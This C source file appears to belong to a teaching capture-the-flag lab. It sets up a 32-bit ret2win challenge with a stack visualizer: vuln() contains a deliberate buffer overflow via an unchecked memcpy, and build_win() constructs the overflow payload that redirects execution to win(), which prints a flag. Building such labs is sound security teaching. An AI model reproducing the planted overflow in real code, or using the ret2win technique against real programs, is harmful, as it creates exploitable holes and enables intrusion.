/*
 * main.c — ch3_32bit: 32-bit ret2win with a live, colorized stack view.
 *
 * The overflow lives in vuln() below; main() just wires up the challenge
 * and hands control to the visual.h framework (vf_repl).
 *
 * Build: see Makefile (gcc -m32 ...).
 *
 * THE GOAL
 *   ret2win: overwrite the saved EIP with the address of win(), which
 *   prints /flag.txt.  On 32-bit there is no stack-alignment gadget to
 *   worry about: offset + win() is enough.
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define VF_LABEL "ch3_32bit"
#define VF_TITLE "32-bit ret2win - interactive stack visualizer"
#define VF_BUF_SIZE 64
#include "visual.h"

void win(void)
{
    char flag[128];
    FILE *f = fopen("/flag.txt", "r");

    printf("\n" VF_BGRN VF_BOLD "******************* WIN *******************" VF_RST "\n");
    if (!f) {
        printf(VF_BRED "win() reached, but /flag.txt is missing" VF_RST "\n");
        _exit(0);
    }
    if (fgets(flag, sizeof(flag), f)) {
        char *nl = strchr(flag, '\n');
        if (nl) *nl = '\0';
        printf(VF_BGRN VF_BOLD "SECRET: %s" VF_RST "\n", flag);
    }
    fclose(f);
    printf(VF_BGRN VF_BOLD "*******************************************" VF_RST "\n");
    _exit(0);
}

/* ------------------------- the vulnerable function ------------------- */
void vuln(void)
{
    char buf[VF_BUF_SIZE];

    VF_SETUP(buf);
    vf_preview();

    if (vf_len) {
        size_t n = vf_len > VF_MAX_LEN ? VF_MAX_LEN : vf_len;
        memcpy(buf, vf_payload, n);    /* <-- the overflow */
    }
    vf_restore(buf);
}

/* ------------------------------ win payload --------------------------- */
/* 32-bit ret2win: [ 'A'*64 ][ 'B'*4 ][ p32(win) ] */
static void build_win(unsigned char *out, size_t *out_len)
{
    size_t off = vf_eip_off, n = 0;
    uint32_t winp = (uint32_t)(uintptr_t)&win;

    memset(out, 'A', VF_BUF_SIZE); n = VF_BUF_SIZE;
    while (n < off) out[n++] = 'B';
    memcpy(out + n, &winp, 4); n += 4;
    *out_len = n;
}

static void banner(void)
{
    printf(VF_BOLD "  win()  = " VF_BGRN "0x%08x" VF_RST "\n",
           (unsigned)(uintptr_t)&win);
    printf(VF_DIM "  goal: overwrite saved EIP with win() (ret2win)" VF_RST "\n");
}

int main(void)
{
    vf_banner_hook = banner;
    vf_win_builder = build_win;
    return vf_repl();
}
